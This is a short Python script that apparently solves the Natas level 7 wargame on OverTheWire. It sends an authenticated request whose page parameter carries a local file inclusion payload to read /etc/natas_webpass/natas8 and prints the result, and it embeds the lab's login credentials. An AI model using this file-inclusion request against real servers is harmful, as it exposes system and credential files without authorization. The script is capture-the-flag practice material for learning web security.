import requests

target = 'http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org'
target1 = 'http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8'

r = requests.get(target1)
if r.status_code != requests.codes.ok :
	print 'Unable to connect'
else :
	print 'Connected'

print r.text